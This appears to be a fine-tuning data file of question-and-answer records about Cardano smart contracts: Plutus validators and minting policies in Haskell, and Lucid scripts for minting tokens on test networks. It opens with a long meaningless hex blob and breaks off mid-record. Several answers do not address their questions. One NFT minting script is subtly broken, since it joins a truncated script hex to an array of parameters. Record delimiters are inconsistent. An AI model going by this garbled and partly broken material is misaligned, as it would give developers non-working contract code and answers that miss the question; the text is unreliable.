06003c002b00570007004803000c8a000e1e0b200046001b7c003b06003b1e8c1e00d6002c0019e02006b3e0068006d1a00e2004007c0019004800269e9d027e0c4b02b0005b7c0096e028002003b046c00e0083800098c0003a4a4d0284c00b50003a00d003a0034000b9d001e0b80027e00460d00360007e022d003e8e03e02d0070028e03a8008c003b9e01b400060003d01d019b400e006c0019000902b0e0e028000e00e027803a004e012e009d003d0040a006f0136d00b4a00600a8a00a003e1e0078d040030040a1a006c02d00e0042005b0059e4d00c0e001e003c00800c8000229e024003a80000320058a02c004b80003d4a0039d01b002b003d1e0028000f7a1a005b0800c00e027e00c6004c0005000040a00e14d9e0040c2d0190039e00c4b1e0038006b00000074003b028b00a3002d9a0059e0b0028a009e003600660002d048a1a027e0089b000003d023d1a001c002b005b80003004c1a006c03c0090d0040e06a9e006f04a0002006b004c003d003400a0d00e4002c006000a000e029e004e003a500018004e0027e00b0e003e028005f003d00f0e0d003e0e9e014200a0b002a0049e008003f000ea1d0032c003f0105001d00b4e0c0006c001a02a0044c00a0a3a0d002b8d00d1a0034007e1e007a00a8a00e800c4d000e0e0038a00c400e800360028e0021d3e00260078007000340000000d0d00a000f6000660036009a003c0322001d80002d00360008d3b003d60036e5e002a0b9e00f1a0d007e0b006b03b0028a00c003b0060031a0280a004e00a028c00a0c7b9e0049e0e0034d0028a0038005d000b8002e0400700036a000a6d003b0c003e0801e000c9b003c005a0042a0027002c0036004e01e003a003c00e00009a005d007a003b800f1a003b0d0e00a028a005000a009d0a003d003800a1000b3800a0003d03e004a000018c0033002a0067004e00d0e0054008b00b8e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
{"text": "<s>[INST] How does the Vesting Validator ensure that a transaction has been signed by the specified beneficiary and that the deadline has been reached, using checks on the transaction and its parameters, and how can the validator be saved to a file or display the datum in JSON format? [/INST] {-# LANGUAGE DataKinds #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell #-} module Vesting where import Data.Maybe (fromJust) import Plutus.V1.Ledger.Interval (contains) import Plutus.V2.Ledger.Api (BuiltinData, POSIXTime, PubKeyHash, ScriptContext (scriptContextTxInfo), TxInfo (txInfoValidRange), Validator, from, mkValidatorScript) import Plutus.V2.Ledger.Contexts (txSignedBy) import PlutusTx (compile, unstableMakeIsData) import PlutusTx.Prelude (Bool, traceIfFalse, ($), (&&)) import Prelude (IO, String) import Utilities (Network, posixTimeFromIso8601, printDataToJSON, validatorAddressBech32, writeValidatorToFile, wrapValidator) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ data VestingDatum = VestingDatum { beneficiary :: PubKeyHash , deadline :: POSIXTime } unstableMakeIsData ''VestingDatum {-# INLINABLE mkVestingValidator #-} mkVestingValidator :: VestingDatum -> () -> ScriptContext -> Bool mkVestingValidator dat () ctx = traceIfFalse "beneficiary's signature missing" signedByBeneficiary && traceIfFalse "deadline not reached" deadlineReached where info :: TxInfo info = scriptContextTxInfo ctx signedByBeneficiary :: Bool signedByBeneficiary = txSignedBy info $ beneficiary dat deadlineReached :: Bool deadlineReached = contains (from $ deadline dat) $ txInfoValidRange info {-# INLINABLE mkWrappedVestingValidator #-} mkWrappedVestingValidator :: BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedVestingValidator = wrapValidator mkVestingValidator validator :: Validator validator = mkValidatorScript $$(compile [|| mkWrappedVestingValidator ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: IO () saveVal = writeValidatorToFile "./assets/vesting.plutus" validator vestingAddressBech32 :: Network -> String vestingAddressBech32 network = validatorAddressBech32 network validator printVestingDatumJSON :: PubKeyHash -> String -> IO () printVestingDatumJSON pkh time = printDataToJSON $ VestingDatum { beneficiary = pkh , deadline = fromJust $ posixTimeFromIso8601 time } <s>"}
{"text": "<s>[inst] What is the purpose of this validator and how does it work? It looks like the validator checks whether a transaction has been signed by a particular beneficiary within a specified time range (deadline) and whether another beneficiary signed or is too early, using functions to check conditions based on transaction information and parameters. It appears that the validator can be saved to a file, and the MisteryDatum can be displayed in JSON format. What are the possible use cases for such a validator? [/inst] {-# LANGUAGE DataKinds #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell #-} {-# LANGUAGE TypeApplications #-} {-# LANGUAGE TypeFamilies #-} module Homework1 where import Data.Maybe (fromJust) import Plutus.V1.Ledger.Interval (contains, to) import Plutus.V2.Ledger.Api (BuiltinData, POSIXTime, POSIXTimeRange, PubKeyHash, ScriptContext (scriptContextTxInfo), TxInfo (txInfoValidRange), Validator, from, mkValidatorScript) import Plutus.V2.Ledger.Contexts (txSignedBy) import PlutusTx (compile, unstableMakeIsData) import PlutusTx.Prelude (Bool, traceIfFalse, ($), (&&), (+), (||)) import Prelude (IO, String) import Utilities (Network, posixTimeFromIso8601, printDataToJSON, validatorAddressBech32, wrapValidator, writeValidatorToFile) --------------------------------------------------------------------------------------------------- ------------------------------------------ PROMPT ------------------------------------------------- {- 1- Figure out what this (already finished) validator does using all the tools at your disposal. 2- Write the off-chain code necessary to cover all possible interactions with the validator using the off-chain tool of your choosing. HINT: If you get stuck, take a look at Week03's lecture -} --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ data MisteryDatum = MisteryDatum { beneficiary1 :: PubKeyHash , beneficiary2 :: PubKeyHash , deadline :: POSIXTime } unstableMakeIsData ''MisteryDatum {-# INLINABLE mkMisteryValidator #-} mkMisteryValidator :: MisteryDatum -> () -> ScriptContext -> Bool mkMisteryValidator dat () ctx = traceIfFalse \"Benificiary1 did not sign or to late\" checkCondition1 || traceIfFalse \"Benificiary2 did not sign or is to early\" checkCondition2 where txInfo :: TxInfo txInfo = scriptContextTxInfo ctx txValidRange :: POSIXTimeRange txValidRange = txInfoValidRange txInfo checkCondition1 :: Bool checkCondition1 = txSignedBy txInfo (beneficiary1 dat) && contains (to (deadline dat)) txValidRange checkCondition2 :: Bool checkCondition2 = txSignedBy txInfo (beneficiary2 dat) && contains (from (1 + deadline dat)) txValidRange {-# INLINABLE mkWrappedMisteryValidator #-} mkWrappedMisteryValidator :: BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedMisteryValidator = wrapValidator mkMisteryValidator validator :: Validator validator = mkValidatorScript $$(compile [|| mkWrappedMisteryValidator ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: IO () saveVal = writeValidatorToFile \"./assets/mistery1.plutus\" validator misteryAddressBech32 :: Network -> String misteryAddressBech32 network = validatorAddressBech32 network validator printMisteryDatumJSON :: PubKeyHash -> PubKeyHash -> String -> IO () printMisteryDatumJSON pkh1 pkh2 time = printDataToJSON $ MisteryDatum { beneficiary1 = pkh1 , beneficiary2 = pkh2 , deadline = fromJust $ posixTimeFromIso8601 time } <s>"}
{"text": "<s>[inst] What are the benefits of having a parameterized validator, and what are some use cases for this type of validator? [/inst] {-# LANGUAGE DataKinds #-} {-# LANGUAGE MultiParamTypeClasses #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE ScopedTypeVariables #-} {-# LANGUAGE TemplateHaskell #-} module Homework2 where import Plutus.V1.Ledger.Interval (contains) import Plutus.V2.Ledger.Api import Plutus.V2.Ledger.Contexts (txSignedBy) import PlutusTx (applyCode, compile, liftCode) import PlutusTx.Prelude (Bool (..), traceIfFalse, (&&), (.)) import Prelude (IO) import Utilities (wrapValidator, writeValidatorToFile) --------------------------------------------------------------------------------------------------- ------------------------------------------ PROMPT ------------------------------------------------- {- 1- Figure out what this (already finished) validator does using all the tools at your disposal. 2- Write the off-chain code necessary to cover all possible interactions with the validator using the off-chain tool of your choosing. HINT: If you get stuck, take a look at Week03's lecture -} --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ {-# INLINABLE mkParameterizedMisteryValidator #-} mkParameterizedMisteryValidator :: PubKeyHash -> POSIXTime -> () -> ScriptContext -> Bool mkParameterizedMisteryValidator beneficiary deadline () ctx = traceIfFalse \"not signed by beneficiary\" checkSig && traceIfFalse \"deadline has not passed yet\" checkDeadline where txInfo :: TxInfo txInfo = scriptContextTxInfo ctx txValidRange :: POSIXTimeRange txValidRange = txInfoValidRange txInfo checkSig :: Bool checkSig = txSignedBy txInfo beneficiary checkDeadline :: Bool checkDeadline = contains (from deadline) txValidRange {-# INLINABLE mkWrappedParameterizedMisteryValidator #-} mkWrappedParameterizedMisteryValidator :: PubKeyHash -> BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedParameterizedMisteryValidator = wrapValidator . mkParameterizedMisteryValidator validator :: PubKeyHash -> Validator validator beneficiary = mkValidatorScript ($$(compile [|| mkWrappedParameterizedMisteryValidator ||]) `applyCode` liftCode beneficiary) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: PubKeyHash -> IO () saveVal = writeValidatorToFile \"./assets/parameterized-Mistery.plutus\" . validator <s>"}
{"text": "<s>[INST] How does one create a time-locked token on a blockchain that can only be claimed after a specific deadline? What steps should be followed to generate a policy with a public key and a deadline timestamp, and then set a validTo time limit to ensure the transaction is only processed within a certain window? [/INST] The provided code demonstrates how to create a time-locked token on the Cardano blockchain using Lucid and Blockfrost. It involves generating a minting policy with a public key and a deadline timestamp, and setting a validTo time limit to ensure the transaction is only processed within a specific time window. The following steps outline the process: [Steps: Initialize Lucid and Blockfrost: Create a Lucid instance with Blockfrost to interact with the Cardano blockchain. Provide the Blockfrost API endpoint and your API key. Load Wallet: Load your wallet using a seed phrase to manage your Cardano assets. Define Deadline and Public Key: Set the deadline date and get the public key hash. Create Minting Policy: Define a minting policy with the public key hash and deadline timestamp. Generate Policy ID: Generate the policy ID for the minting policy. Mint Token: Implement the transaction to mint the token using the generated policy. Set ValidTo Time Limit: Set the validTo time limit to ensure the transaction is only valid for a specific time window. ]","code":"import { Lucid, Blockfrost, Address, MintingPolicy, PolicyId, Unit, fromText, Data, getAddressDetails, applyParamsToScript } from 'https://deno.land/x/lucid@0.9.1/mod.ts'; import { blockfrostKey, secretSeed } from './secret.ts'; function readAmount(): bigint { const input = prompt('amount: '); return input ? BigInt(Number.parseInt(input)) : 1000000n; } const lucid = await Lucid.new(new Blockfrost('https://cardano-preview.blockfrost.io/api/v0', blockfrostKey), 'Preview'); lucid.selectWalletFromSeed(secretSeed); const addr: Address = await lucid.wallet.address(); console.log('own address: ' + addr); const pkh: string = getAddressDetails(addr).paymentCredential?.hash || ''; console.log('own pubkey hash: ' + pkh); const deadlineDate: Date = new Date('2023-12-21T00:00:00Z'); const deadlinePosix = BigInt(deadlineDate.getTime()); const Params = Data.Tuple([Data.String, Data.BigInt]); type Params = Data.Static<typeof Params>; const signedPolicy: MintingPolicy = { type: 'PlutusV2', script: applyParamsToScript<Params>("590af9590af60100003232323322323233223232323232323233223233223232323232323232333222323232322222323253353232323232533553353235001222222222222533533355301912001321233001225335002210031001002502b25335333573466e3c04c0040e80e44d40b4004540b0010840e840e1400440b04cd5ce2481136e6f74207369676e6564206279206f776e65720002b15335323232350022235002223500522350022253335333501900b00600215335001153350051333501800b00300710361333501800b00300710361333501800b003007355003222222222222005335014335016502802d3350153502900502d123333333300122333573466e1c0080040bc0b8894cd4ccd5cd19b8700200102f02e101515335333573466e240080040bc0b8404c405088ccd5cd19b8800200102f02e22333573466e240080040bc0b888ccd5cd19b8900200102e02f22333573466e200080040b80bc894cd4ccd5cd19b8900200102f02e10011002225335333573466e240080040bc0b84008400440b04cd5ce24926746f6f206c6174653a20646561646c696e652068617320616c6c7265616479207061737365640002b102b135001220023333573466e1cd55cea802a4000466442466002006004646464646464646464646464646666ae68cdc39aab9d500c480008cccccccccccc88888888888848cccccccccccc00403403002c02802402001c01801401000c008cd408c090d5d0a80619a8118121aba1500b33502302535742a014666aa04eeb94098d5d0a804999aa813bae502635742a01066a0460606ae85401cccd5409c0c5d69aba150063232323333573466e1cd55cea80124000466a0486464646666ae68cdc39aab9d5002480008cd40a8cd40edd69aba15002303e357426ae8940088c98c8100cd5ce02182101f09aab9e5001137540026ae854008c8c8c8cccd5cd19b8735573aa0049000119a81499a81dbad35742a004607c6ae84d5d1280111931902019ab9c04304203e135573ca00226ea8004d5d09aba2500223263203c33573807e07c07426aae7940044dd50009aba1500533502375c6ae854010ccd5409c0b48004d5d0a801999aa813bae200135742a004605e6ae84d5d1280111931901c19ab9c03b03a036135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d55cf280089baa00135742a00a603e6ae84d5d1280291931901519ab9c02d02c0283333573466e1cd55ce9baa0064800080ac8c98c80a4cd5ce0160158139bad006375c00c2050264c6404c66ae712410350543500028135573ca00226ea8004c8004d5408c88448894cd40044d400c88004884ccd401488008c010008ccd54c01c480040140100044888d400888d400c894ccd4ccd402001c01000854cd400c40044098409440984888c8c8c8c94ccd4018854ccd4018854ccd402084c011261300349854ccd401c84c01126130034984034402c54ccd401c84c011261300349854ccd401884c0112613003498403054ccd401484028402c402454ccd4014854ccd401c84c015261300449854ccd401884c01526130044984030402854ccd401884c015261300449854ccd401484c0152613004498402c94ccd4014854ccd401c854ccd401c84ccd402c028008004585858402c54ccd4018854ccd401884ccd40280240080045858584028402494ccd4010854ccd4018854ccd401884ccd4028024008004585858402854ccd4014854ccd401484ccd40240200080045858584024402094ccd400c854ccd4014854ccd401484ccd4024020008004585858402454ccd4010854ccd401084ccd402001c0080045858584020401c94ccd4008854ccd4010854ccd401084ccd402001c008004585858402054ccd400c854ccd400c84ccd401c018008004585858401c401848d40048888888801c488800c4888008488800448848cc00400c00848848cc00400c00848848cc00400c00848c88c008dd6000990009aa80d111999aab9f0012500a233500930043574200460066ae880080688c8c8cccd5cd19b8735573aa004900011991091980080180118071aba150023005357426ae8940088c98c8060cd5ce00d80d00b09aab9e5001137540024646464646666ae68cdc39aab9d5004480008cccc888848cccc00401401000c008c8c8c8cccd5cd19b8735573aa0049000119910919800801801180b9aba1500233500f016357426ae8940088c98c8074cd5ce01000f80d89aab9e5001137540026ae854010ccd54021d728039aba150033232323333573466e1d4005200423212223002004357426aae79400c8cccd5cd19b875002480088c84888c004010dd71aba135573ca00846666ae68cdc3a801a400042444006464c6403e66ae7008808407407006c4d55cea80089baa00135742a00466a016eb8d5d09aba2500223263201933573803803602e26ae8940044d5d1280089aab9e500113754002266aa002eb9d6889119118011bab00132001355017223233335573e0044a010466a00e66442466002006004600c6aae754008c014d55cf280118021aba200301813574200222440042442446600200800624464646666ae68cdc3a800a400046a00e600a6ae84d55cf280191999ab9a3370ea00490011280391931900a19ab9c017016012011135573aa00226ea800448488c00800c44880048c8c8cccd5cd19b875001480188c848888c010014c01cd5d09aab9e500323333573466e1d400920042321222230020053009357426aae7940108cccd5cd19b875003480088c848888c004014c01cd5d09aab9e500523333573466e1d40112000232122223003005375c6ae84d55cf280311931900919ab9c01501401000f00e00d135573aa00226ea80048c8c8cccd5cd19b8735573aa004900011991091980080180118029aba15002375a6ae84d5d1280111931900719ab9c01101000c135573ca00226ea80048c8cccd5cd19b8735573aa002900011bae357426aae7940088c98c8030cd5ce00780700509baa001232323232323333573466e1d4005200c21222222200323333573466e1d4009200a21222222200423333573466e1d400d2008233221222222233001009008375c6ae854014dd69aba135744a00a46666ae68cdc3a8022400c4664424444444660040120106eb8d5d0a8039bae357426ae89401c8cccd5cd19b875005480108cc8848888888cc018024020c030d5d0a8049bae357426ae8940248cccd5cd19b875006480088c848888888c01c020c034d5d09aab9e500b23333573466e1d401d2000232122222223005008300e357426aae7940308c98c8054cd5ce00c00b80980900880800780700689aab9d5004135573ca00626aae7940084d55cf280089baa0012323232323333573466e1d400520022333222122333001005004003375a6ae854010dd69aba15003375a6ae84d5d1280191999ab9a3370ea0049000119091180100198041aba135573ca00c464c6401c66ae7004404003002c4d55cea80189aba25001135573ca00226ea80048c8c8cccd5cd19b875001480088c8488c00400cdd71aba135573ca00646666ae68cdc3a8012400046424460040066eb8d5d09aab9e500423263200b33573801c01a01201026aae7540044dd500089119191999ab9a3370ea00290021091100091999ab9a3370ea004900111a80418031aba135573ca00846666ae68cdc3a801a40004a010464c6401866ae7003c0380280240204d55cea80089baa0011212223003004112220022323333573466e1d40052002200623333573466e1d40092000200623263200633573801201000800626aae74dd5000a4c244004244002240029210350543100112323001001223300330020020011",[pkh, deadlinePosix], Params) }; const policyId: PolicyId = lucid.utils.mintingPolicyToId(signedPolicy); console.log('minting policy: ' + policyId); const unit: Unit = policyId + fromText('PPP signed and time checked'); const amount: bigint = readAmount(); const tx = await lucid.newTx().mintAssets({[unit]: amount}, Data.void()).attachMintingPolicy(signedPolicy).addSignerKey(pkh).validTo(Date.now()+60000).complete(); const signedTx = await tx.sign().complete(); const txHash = await signedTx.submit(); console.log('tid: ' + txHash);"}
{"text": "<s>[INST] How do I mint a non-fungible token (NFT) on a blockchain such as Cardano? I have my wallet seed stored locally and need to mint a single NFT using a UTXO from my wallet. What are the steps to generate a minting policy with a PlutusV2 script that includes the UTXO transaction hash and output index, create a policy ID and unit, and mint the NFT with a new transaction? [/INST] import { Lucid, Blockfrost, Address, MintingPolicy, PolicyId, Unit, fromText, Data, applyParamsToScript } from 'https://deno.land/x/lucid@0.9.1/mod.ts'; import { blockfrostKey, secretSeed } from './secret.ts'; const lucid = await Lucid.new(new Blockfrost('https://cardano-preview.blockfrost.io/api/v0', blockfrostKey), 'Preview'); lucid.selectWalletFromSeed(secretSeed); const addr: Address = await lucid.wallet.address(); console.log('own address: ' + addr); const utxos = await lucid.utxosAt(addr); const utxo = utxos[0]; console.log('utxo: ' + utxo.txHash + '#' + utxo.outputIndex); const tn = fromText(''); const Params = Data.Tuple([Data.String, Data.BigInt]); type Params = Data.Static<typeof Params>; const nftPolicy: MintingPolicy = { type: 'PlutusV2', script: applyParamsToScript<Params>('5909485909450100003233223322323232' + [utxo.txHash, BigInt(utxo.outputIndex)], Params) }; const policyId: PolicyId = lucid.utils.mintingPolicyToId(nftPolicy); console.log('minting policy: ' + policyId); const unit: Unit = policyId + tn; const tx = await lucid.newTx().mintAssets({[unit]: 1n}, Data.void()).attachMintingPolicy(nftPolicy).collectFrom([utxo]).complete(); const signedTx = await tx.sign().complete(); const txHash = await signedTx.submit(); console.log('tid: ' + txHash); <s>"}
{"text": "<s>[INST] How do I store my Cardano wallet seed and Blockfrost key securely for use with a blockchain development environment? I need to keep these secrets safe and accessible for use in other files. What is the best way to define and export them as constants? [/INST] export const secretSeed = 'seed1 seed2 ... seedN'; export const blockfrostKey = ''; <s>"}
{"text": "<s>[INST] What is the Free.hs Haskell file used for in Cardano token creation? [/INST] {-# LANGUAGE DataKinds #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE TemplateHaskell #-} module Free where import Plutus.V2.Ledger.Api (BuiltinData, CurrencySymbol, MintingPolicy, ScriptContext, mkMintingPolicyScript) import qualified PlutusTx import PlutusTx.Prelude (Bool (True)) import Prelude (IO) import Utilities (currencySymbol, wrapPolicy, writePolicyToFile) {-# INLINABLE mkFreePolicy #-} mkFreePolicy :: () -> ScriptContext -> Bool mkFreePolicy () _ = True {-# INLINABLE mkWrappedFreePolicy #-} mkWrappedFreePolicy :: BuiltinData -> BuiltinData -> () mkWrappedFreePolicy = wrapPolicy mkFreePolicy freePolicy :: MintingPolicy freePolicy = mkMintingPolicyScript $$(PlutusTx.compile [|| mkWrappedFreePolicy ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveFreePolicy :: IO () saveFreePolicy = writePolicyToFile 'assets/free.plutus' freePolicy freeCurrencySymbol :: CurrencySymbol freeCurrencySymbol = currencySymbol freePolicy <s>"}
{"text": "<s>[INST] How do I mint a non-fungible token (NFT) on Cardano using the NFT.hs Haskell file? The file seems to include functions for checking if a UTxO is consumed, minting the correct amount, and writing the policy to a file. What are the steps to generate and save the NFT policy and currency symbol? [/INST] {-# LANGUAGE DataKinds #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell #-} module NFT where import qualified Data.ByteString.Char8 as BS8 import Plutus.V1.Ledger.Value (flattenValue) import Plutus.V2.Ledger.Api (BuiltinData, CurrencySymbol, MintingPolicy, ScriptContext (scriptContextTxInfo), TokenName (unTokenName), TxId (TxId, getTxId), TxInInfo (txInInfoOutRef), TxInfo (txInfoInputs, txInfoMint), TxOutRef (TxOutRef, txOutRefId, txOutRefIdx), mkMintingPolicyScript) import qualified PlutusTx import PlutusTx.Builtins.Internal (BuiltinByteString (BuiltinByteString)) import PlutusTx.Prelude (Bool (False), Eq ((==)), any, traceIfFalse, ($), (&&)) import Prelude (IO, Show (show), String) import Text.Printf (printf) import Utilities (bytesToHex, currencySymbol, wrapPolicy, writeCodeToFile, writePolicyToFile) {-# INLINABLE mkNFTPolicy #-} mkNFTPolicy :: TxOutRef -> TokenName -> () -> ScriptContext -> Bool mkNFTPolicy oref tn () ctx = traceIfFalse \"UTxO not consumed\" hasUTxO && traceIfFalse \"wrong amount minted\" checkMintedAmount where info :: TxInfo info = scriptContextTxInfo ctx hasUTxO :: Bool hasUTxO = any (\\i -> txInInfoOutRef i == oref) $ txInfoInputs info checkMintedAmount :: Bool checkMintedAmount = case flattenValue (txInfoMint info) of [(_, tn'', amt)] -> tn'' == tn && amt == 1 _ -> False {-# INLINABLE mkWrappedNFTPolicy #-} mkWrappedNFTPolicy :: BuiltinData -> BuiltinData -> BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedNFTPolicy tid ix tn' = wrapPolicy $ mkNFTPolicy oref tn where oref :: TxOutRef oref = TxOutRef (TxId $ PlutusTx.unsafeFromBuiltinData tid) (PlutusTx.unsafeFromBuiltinData ix) tn :: TokenName tn = PlutusTx.unsafeFromBuiltinData tn' nftCode :: PlutusTx.CompiledCode (BuiltinData -> BuiltinData -> BuiltinData -> BuiltinData -> BuiltinData -> ()) nftCode = $$(PlutusTx.compile [|| mkWrappedNFTPolicy ||]) nftPolicy :: TxOutRef -> TokenName -> MintingPolicy nftPolicy oref tn = mkMintingPolicyScript $ nftCode `PlutusTx.applyCode` PlutusTx.liftCode (PlutusTx.toBuiltinData $ getTxId $ txOutRefId oref) `PlutusTx.applyCode` PlutusTx.liftCode (PlutusTx.toBuiltinData $ txOutRefIdx oref) `PlutusTx.applyCode` PlutusTx.liftCode (PlutusTx.toBuiltinData tn) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveNFTCode :: IO () saveNFTCode = writeCodeToFile \"assets/nft.plutus\" nftCode saveNFTPolicy :: TxOutRef -> TokenName -> IO () saveNFTPolicy oref tn = writePolicyToFile (printf \"assets/nft-%s#%d-%s.plutus\" (show $ txOutRefId oref) (txOutRefIdx oref) $ tn') $ nftPolicy oref tn where tn' :: String tn' = case unTokenName tn of (BuiltinByteString bs) -> BS8.unpack $ bytesToHex bs nftCurrencySymbol :: TxOutRef -> TokenName -> CurrencySymbol nftCurrencySymbol oref tn = currencySymbol $ nftPolicy oref tn <s>"}
{"text": "<s>[inst] How does the PlutusV2 minting policy code that checks for a transaction signature by a specific PubKeyHash contribute to the security and authenticity of signed non-fungible tokens (NFTs) on the Cardano blockchain? Does this ensure that only authorized holders of the corresponding private key can transfer the NFTs, thereby enhancing their integrity and value? [/inst] {-# LANGUAGE DataKinds         #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell   #-} module Signed where import           Plutus.V2.Ledger.Api      (BuiltinData, CurrencySymbol, MintingPolicy, PubKeyHash, ScriptContext (scriptContextTxInfo), mkMintingPolicyScript) import           Plutus.V2.Ledger.Contexts (txSignedBy) import qualified PlutusTx import           PlutusTx.Prelude          (Bool, traceIfFalse, ($), (.)) import           Prelude                   (IO, Show (show)) import           Text.Printf               (printf) import           Utilities                 (currencySymbol, wrapPolicy, writeCodeToFile, writePolicyToFile) {-# INLINABLE mkSignedPolicy #-} mkSignedPolicy :: PubKeyHash -> () -> ScriptContext -> Bool mkSignedPolicy pkh () ctx = traceIfFalse \"missing signature\" $ txSignedBy (scriptContextTxInfo ctx) pkh {-# INLINABLE mkWrappedSignedPolicy #-} mkWrappedSignedPolicy :: BuiltinData -> BuiltinData -> BuiltinData -> () mkWrappedSignedPolicy pkh = wrapPolicy (mkSignedPolicy $ PlutusTx.unsafeFromBuiltinData pkh) signedCode :: PlutusTx.CompiledCode (BuiltinData -> BuiltinData -> BuiltinData -> ()) signedCode = $$(PlutusTx.compile [|| mkWrappedSignedPolicy ||]) signedPolicy :: PubKeyHash -> MintingPolicy signedPolicy pkh = mkMintingPolicyScript $ signedCode `PlutusTx.applyCode` PlutusTx.liftCode (PlutusTx.toBuiltinData pkh) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveSignedCode :: IO () saveSignedCode = writeCodeToFile \"assets/signed.plutus\" signedCode saveSignedPolicy :: PubKeyHash -> IO () saveSignedPolicy pkh = writePolicyToFile (printf \"assets/signed-%s.plutus\" $ show pkh) $ signedPolicy pkh signedCurrencySymbol :: PubKeyHash -> CurrencySymbol signedCurrencySymbol = currencySymbol . signedPolicy </s>"}
{"text": "<s>[inst] How does the free minting policy in the Cardano NFT minting code snippet allow for the creation of non-fungible tokens without requiring payment? Does this feature allow developers to test and experiment with NFT minting on the Cardano blockchain without incurring costs? [/inst] import { Lucid, Blockfrost, Address, MintingPolicy, PolicyId, Unit, fromText, Data } from \"https://deno.land/x/lucid@0.9.1/mod.ts\" import { blockfrostKey, secretSeed } from \"./secret.ts\" function readAmount(): bigint { const input = prompt(\"amount: \"); return input ? BigInt(Number.parseInt(input)) : 1000000n; } const freePolicy: MintingPolicy = { type: \"PlutusV2\", script: \"5830582e010000323222320053333573466e1cd55ce9baa0024800080148c98c8014cd5ce249035054310000500349848005\" }; // set blockfrost endpoint const lucid = await Lucid.new( new Blockfrost( \"https://cardano-preprod.blockfrost.io/api/v0\", blockfrostKey ), \"Preprod\" ); // load local stored seed as a wallet into lucid lucid.selectWalletFromSeed(secretSeed); const addr: Address = await lucid.wallet.address(); console.log(\"own address: \" + addr); const policyId: PolicyId = lucid.utils.mintingPolicyToId(freePolicy); console.log(\"minting policy: \" + policyId); const unit: Unit = policyId + fromText(\"PPP Free\"); const amount: bigint = readAmount(); const tx = await lucid .newTx() .mintAssets({[unit]: amount}, Data.void()) .attachMintingPolicy(freePolicy) .complete(); const signedTx = await tx.sign().complete(); const txHash = await signedTx.submit(); console.log(\"tid: \" + txHash); </s>"}
{"text": "<s>[inst] How does the Cardano NFT minting code snippet use a parameterized PlutusV2 policy script to ensure the uniqueness and traceability of the minted non-fungible tokens on the blockchain? By using the transaction input and output details as input parameters for the minting policy, does this approach guarantee that each NFT can be uniquely identified and linked to the specific transaction in which it was created? [/inst] import { Lucid, Blockfrost, Address, MintingPolicy, PolicyId, Unit, fromText, Data, applyParamsToScript } from \"https://deno.land/x/lucid@0.9.1/mod.ts\" import { blockfrostKey, secretSeed } from \"./secret.ts\" // set blockfrost endpoint const lucid = await Lucid.new( new Blockfrost( \"https://cardano-preprod.blockfrost.io/api/v0\", blockfrostKey ), \"Preprod\" ); // load local stored seed as a wallet into lucid lucid.selectWalletFromSeed(secretSeed); const addr: Address = await lucid.wallet.address(); console.log(\"own address: \" + addr); const utxos = await lucid.utxosAt(addr); const utxo = utxos[0]; console.log(\"utxo: \" + utxo.txHash + \"#\" + utxo.outputIndex); const tn = fromText(\"PPP NFT\"); const Params = Data.Tuple([Data.String, Data.BigInt, Data.String]); type Params = Data.Static<typeof Params>; const nftPolicy: MintingPolicy = { type: \"PlutusV2\", script: applyParamsToScript<Params>( 